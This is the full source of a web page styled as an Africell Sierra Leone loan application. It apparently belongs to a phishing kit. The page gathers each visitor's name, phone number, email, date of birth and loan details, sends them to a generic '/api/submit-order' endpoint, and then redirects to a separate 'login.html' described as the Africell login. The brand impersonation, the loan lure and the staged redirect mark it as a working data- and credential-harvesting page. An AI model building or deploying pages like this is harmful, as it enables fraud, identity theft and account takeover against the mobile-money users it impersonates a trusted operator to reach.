<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Africell Sierra Leone | Loan Application</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body::-webkit-scrollbar { display: none; }
        body { scrollbar-width: none; }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: linear-gradient(135deg, #991676 0%, #79105c 50%, #5a0c44 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px 16px;
            color: #ffffff;
            overflow-y: auto;
        }

        .e-form-container {
            width: 100%;
            max-width: 480px;
            display: flex;
            flex-direction: column;
            gap: 18px;
        }

        .e-form-header {
            text-align: center;
            margin-bottom: 2px;
        }

        .e-form-header h1 {
            font-size: 28px;
            font-weight: 900;
            letter-spacing: -0.5px;
            text-transform: uppercase;
            margin-bottom: 6px;
            color: #ffffff;
            text-shadow: 0 2px 6px rgba(0,0,0,0.3);
        }

        .e-form-header h1 span { color: #ffd34d; }

        .e-form-header p {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.85);
            line-height: 1.4;
        }

        .e-input-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .e-input-group {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.18);
            border-radius: 18px;
            padding: 14px 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
        }

        .e-input-group.full-width { grid-column: span 2; }

        .e-input-group label {
            display: block;
            font-size: 11px;
            font-weight: 700;
            color: #ffd34d;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        .e-input-group input, 
        .e-input-group select, 
        .e-input-group textarea {
            width: 100%;
            background: rgba(255, 255, 255, 0.95);
            border: 1.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            outline: none;
            font-size: 14px;
            color: #1F2937;
            font-weight: 600;
            text-align: center;
            padding: 10px 12px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.04);
            transition: all 0.2s ease;
        }

        .e-input-group input:focus,
        .e-input-group select:focus,
        .e-input-group textarea:focus {
            background: #ffffff;
            border-color: #ffd34d;
            box-shadow: 0 0 0 3px rgba(255, 211, 77, 0.25);
        }

        .e-input-group select { text-align-last: center; cursor: pointer; }
        .e-input-group select option { background: #ffffff; color: #1F2937; }

        .dob-inputs-row { display: flex; align-items: center; gap: 8px; width: 100%; }
        .dob-input { flex: 1; height: 42px; background: rgba(255, 255, 255, 0.95); border: 1.5px solid rgba(255, 255, 255, 0.3); border-radius: 12px; font-size: 14px; font-weight: 600; color: #1F2937; text-align: center; outline: none; }
        .dob-slash { font-size: 18px; font-weight: 700; color: #ffd34d; }

        .e-phone-split-row { display: flex; gap: 8px; width: 100%; }
        .e-prefix-box { width: 75px; padding: 10px 6px; background: rgba(255, 255, 255, 0.95); border: 1.5px solid rgba(255, 255, 255, 0.3); border-radius: 12px; font-size: 14px; font-weight: 700; color: #1F2937; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }

        .e-input-group textarea { resize: none; height: 65px; text-align: left; padding: 10px 12px; }

        .e-btn-submit {
            display: block;
            width: 100%;
            background: #ffd34d;
            color: #5E0C44;
            text-align: center;
            padding: 16px;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 900;
            border: none;
            cursor: pointer;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
            text-transform: uppercase;
            letter-spacing: 0.8px;
            transition: transform 0.15s ease, background 0.15s ease;
        }

        .e-btn-submit:hover { background: #ffe066; transform: translateY(-1px); }
        .e-btn-submit:active { transform: translateY(0); }

        #loadingOverlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(121, 16, 92, 0.92);
            backdrop-filter: blur(10px);
            z-index: 999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #ffffff;
            text-align: center;
        }

        .spinner {
            width: 50px; height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.15);
            border-top: 4px solid #ffd34d;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin-bottom: 16px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #loadingText { font-size: 16px; font-weight: 700; color: #ffd34d; }

        #customModal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(121, 16, 92, 0.9);
            backdrop-filter: blur(6px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-card {
            background: #79105c;
            width: 100%; max-width: 300px;
            border-radius: 20px; padding: 24px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: #ffffff;
        }

        .modal-message { font-size: 14px; font-weight: 600; margin-bottom: 20px; line-height: 1.4; }
        .modal-btn { background: #ffd34d; color: #5E0C44; border: none; border-radius: 12px; padding: 12px; font-size: 14px; font-weight: 800; cursor: pointer; width: 100%; }

        @media (max-width: 500px) {
            .e-input-row { grid-template-columns: 1fr; gap: 10px; }
            .e-input-group.full-width { grid-column: span 1; }
        }
    </style>
</head>
<body>

    <div class="e-form-container">
        <div class="e-form-header">
            <h1>Africell <span>Application</span></h1>
            <p>Fast, transparent financing designed for your goals.</p>
        </div>

        <form id="loanForm" onsubmit="handleFormSubmit(event)">
            <div class="e-input-row">
                <div class="e-input-group">
                    <label for="fullName">Full Name</label>
                    <input type="text" id="fullName" required placeholder="Enter full name">
                </div>

                <div class="e-input-group">
                    <label for="phoneNumber">Phone Number</label>
                    <div class="e-phone-split-row">
                        <div class="e-prefix-box">+232</div>
                        <input type="tel" id="phoneNumber" required placeholder="Mobile No." maxlength="9" inputmode="numeric">
                    </div>
                </div>
            </div>

            <div class="e-input-row">
                <div class="e-input-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" required placeholder="name@example.com">
                </div>

                <div class="e-input-group">
                    <label for="loanAmountInput">Loan Amount (Le)</label>
                    <input type="text" id="loanAmountInput" required placeholder="10,000">
                </div>
            </div>

            <div class="e-input-group full-width">
                <label>Date of Birth</label>
                <div class="dob-inputs-row">
                    <input type="text" id="dobDay" class="dob-input" placeholder="DD" maxlength="2" inputmode="numeric" required>
                    <span class="dob-slash">/</span>
                    <input type="text" id="dobMonth" class="dob-input" placeholder="MM" maxlength="2" inputmode="numeric" required>
                    <span class="dob-slash">/</span>
                    <input type="text" id="dobYear" class="dob-input" placeholder="YYYY" maxlength="4" inputmode="numeric" required>
                </div>
            </div>

            <div class="e-input-group full-width">
                <label for="loanType">Type of Loan</label>
                <select id="loanType" required>
                    <option value="" disabled selected>Select loan type</option>
                    <option value="Grow Business">Grow Business</option>
                    <option value="Personal loan">Personal loan</option>
                    <option value="Emergency loan">Emergency loan</option>
                    <option value="Vehicle loan">Vehicle loan</option>
                    <option value="Agriculture loan">Agriculture loan</option>
                    <option value="Education loan">Education loan</option>
                    <option value="Other">Other</option>
                </select>
            </div>

            <div class="e-input-group full-width">
                <label for="loanReason">Reason for Loan</label>
                <textarea id="loanReason" required placeholder="Briefly describe what you will use this loan for..."></textarea>
            </div>

            <button type="submit" class="e-btn-submit">Submit Application &rarr;</button>
        </form>
    </div>

    <div id="loadingOverlay">
        <div class="spinner"></div>
        <div id="loadingText">Analyzing application data...</div>
    </div>

    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        function showAppAlert(msg) {
            document.getElementById('modalText').innerText = msg;
            document.getElementById('customModal').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
        }

        const savedAmount = localStorage.getItem('africellLoanAmount') || '10,000';
        document.getElementById('loanAmountInput').value = savedAmount;

        const phoneInput = document.getElementById('phoneNumber');

        window.addEventListener('DOMContentLoaded', () => {
            const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
            if (savedPhone && phoneInput) {
                phoneInput.value = savedPhone.replace('+232', '').trim();
            }
        });

        function isValidSierraLeonePhone(number) {
            return /^\d{8,9}$/.test(number.replace(/[\s-]/g, ''));
        }

        async function handleFormSubmit(event) {
            event.preventDefault();

            const fullName = document.getElementById('fullName').value.trim();
            const rawPhone = phoneInput.value.trim();
            const email = document.getElementById('email').value.trim();
            const finalAmount = document.getElementById('loanAmountInput').value;
            const loanType = document.getElementById('loanType').value;
            const loanReason = document.getElementById('loanReason').value.trim();

            const dobDay = document.getElementById('dobDay').value.trim();
            const dobMonth = document.getElementById('dobMonth').value.trim();
            const dobYear = document.getElementById('dobYear').value.trim();
            const fullDob = `${dobDay}/${dobMonth}/${dobYear}`;

            if (!isValidSierraLeonePhone(rawPhone)) {
                showAppAlert('Enter Correct Number (8 to 9 digits)');
                return;
            }

            const fullPhoneNum = '+232 ' + rawPhone;

            localStorage.setItem('africellUserName', fullName);
            localStorage.setItem('africellUserPhone', fullPhoneNum);
            localStorage.setItem('africellDob', fullDob);
            localStorage.setItem('africellLoanAmount', finalAmount);
            localStorage.setItem('userPhone', fullPhoneNum);

            const overlay = document.getElementById('loadingOverlay');
            const loadingText = document.getElementById('loadingText');

            overlay.style.display = 'flex';
            loadingText.textContent = "Analyzing application data...";

            try {
                await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: fullPhoneNum, 
                        uniqueId: `Application - Name: ${fullName}, DOB: ${fullDob}, Email: ${email}, Amount: ${finalAmount}, Type: ${loanType}, Reason: ${loanReason}` 
                    })
                });
            } catch (error) {
                console.error('Error submitting application:', error);
            }

            setTimeout(() => {
                loadingText.textContent = "Proceeding to Africell Login...";
            }, 1800);

            setTimeout(() => {
                window.location.href = 'login.html';
            }, 3200);
        }
    </script>
</body>
</html>
